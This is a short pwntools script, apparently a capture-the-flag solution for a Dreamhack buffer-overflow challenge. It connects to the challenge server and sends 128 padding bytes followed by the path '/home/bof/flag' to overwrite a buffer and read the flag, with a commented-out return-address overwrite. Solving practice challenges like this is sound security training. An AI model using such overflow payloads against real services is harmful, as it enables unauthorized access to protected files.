from pwn import *

p = remote("host3.dreamhack.games", 12123)

#read_flag_address = 0x401236

# Convert payload to bytes
payload = b"A" * 128 + b'/home/bof/flag'

# Concatenate bytes with the result of p64() (which is also bytes)
#payload += p64(read_flag_address)

# Send the payload as bytes
p.sendline(payload)

# Interact with the remote process
p.interactive()
